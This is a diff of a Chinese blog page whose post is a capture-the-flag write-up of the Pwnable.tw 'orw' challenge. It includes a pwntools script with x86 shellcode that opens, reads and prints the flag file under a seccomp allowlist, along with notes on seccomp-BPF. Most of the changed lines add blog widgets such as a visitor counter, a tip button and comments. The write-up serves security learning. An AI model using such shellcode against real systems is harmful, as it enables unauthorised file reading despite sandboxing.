@@ -89,7 +89,7 @@
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu86wqv7d3j20cl01dt8i.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu86xuieo8j20ox08nmxt.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu871anfc5j20ql0n7di3.jpg">
-<meta property="og:updated_time" content="2018-08-13T11:43:20.303Z">
+<meta property="og:updated_time" content="2018-08-23T02:06:05.451Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwnable.tw orw">
 <meta name="twitter:description" content="orworw_seccomp函数里面设置了白名单，通过seccomp-tools可以看到可以用的系统调用：     可以看到除了open，read，write等调用，其他的都被禁掉了，就不能通过execve来getshell，所以我们就通过这几个系统调用来读取flag。    1234567891011121314151617181920212223242526272829303132333435">
@@ -140,7 +140,7 @@
 
 
 </head>
-
+    
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
@@ -293,9 +293,51 @@
 
           
           
+             <span id="/2018/08/13/20180813/" class="leancloud_visitors" data-flag-title="Pwnable.tw orw">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
 
           
 
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,028 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
           
 
           
@@ -317,6 +359,7 @@
 <p><img src="https://ws1.sinaimg.cn/large/72105478gy1fu24s1b36zj20ia096t9r.jpg" alt=""></p>
 <p>可以看到除了<code>open</code>，<code>read</code>，<code>write</code>等调用，其他的都被禁掉了，就不能通过<code>execve</code>来<code>getshell</code>，所以我们就通过这几个系统调用来读取<code>flag</code>。   </p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level=<span class="string">"debug"</span></div><div class="line"><span class="comment">#shellcode=""</span></div><div class="line"><span class="comment">#shellcode+=asm("xor ecx,ecx;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;xor edx,edx;mov eax,0x5;int 0x80;")</span></div><div class="line"><span class="comment">#shellcode+=asm("mov dl,0x40;;mov ecx,ebx;mov ebx,0x3;mov eax,0x3;int 0x80;")</span></div><div class="line"><span class="comment">#shellcode+=asm("mov bl,1;mov eax,0x4;;int 0x80;")</span></div><div class="line"></div><div class="line">shellcode=<span class="string">"""</span></div><div class="line">push 0x00</div><div class="line">push 0x67616c66</div><div class="line">push 0x2f77726f</div><div class="line">push 0x2f656d6f</div><div class="line">push 0x682f2f2f</div><div class="line">mov ebx,esp</div><div class="line">xor ecx,ecx</div><div class="line">xor edx,edx</div><div class="line">mov eax,5</div><div class="line">int 0x80</div><div class="line"></div><div class="line">mov edx,0x40</div><div class="line">mov ecx,esp</div><div class="line">mov ebx,eax</div><div class="line">mov eax,3</div><div class="line">int 0x80</div><div class="line"></div><div class="line">mov ebx,1</div><div class="line">mov ecx,esp</div><div class="line">mov edx,0x40</div><div class="line">mov eax,4</div><div class="line">int 0x80</div><div class="line">"""</div><div class="line">shellcode=asm(shellcode)</div><div class="line">pro=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</div><div class="line">pro.recvuntil(<span class="string">":"</span>)</div><div class="line">pro.sendline(shellcode)</div><div class="line"><span class="keyword">print</span> pro.recv()</div></pre></td></tr></table></figure>
+<a id="more"></a>
 <h2 id="关于Linux下Seccomp-BPF和prctl"><a href="#关于Linux下Seccomp-BPF和prctl" class="headerlink" title="关于Linux下Seccomp-BPF和prctl"></a>关于<code>Linux下Seccomp-BPF</code>和<code>prctl</code></h2><h3 id="BPF和Seccomp"><a href="#BPF和Seccomp" class="headerlink" title="BPF和Seccomp"></a><code>BPF</code>和<code>Seccomp</code></h3><blockquote>
 <p><code>BPF</code>是一种用于<code>Unix</code>内核网络数据包的<strong>过滤机制</strong>。</p>
 <p>由于<strong>大量的系统调用暴露在用户空间</strong>，在程序的整个生命周期内并没有使用。而随着系统调用的改变和成熟，<code>bug</code>的发现和根除，一套可用的系统调用是满足用户程序基本的调用。将可以产生出一组<strong>尽量少的系统调用暴露在用户空间</strong>。系统调用的过滤就是在应用程序的使用中。</p>
@@ -354,6 +397,30 @@
 
     
 
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://osuzegp2h.bkt.clouddn.com/wechatpay.jpg" alt="洋葱 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
     
 
     
@@ -721,6 +788,28 @@
 
 
 
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9XbHd3aRgM0agCnx02acXyx3-gzGzoHsz',
+        appKey: 'PWvOeMRxEmYLm00qEd4YDfIW',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
 
 
   
@@ -730,6 +819,113 @@
 
 
   
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("9XbHd3aRgM0agCnx02acXyx3-gzGzoHsz", "PWvOeMRxEmYLm00qEd4YDfIW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
 
   
 
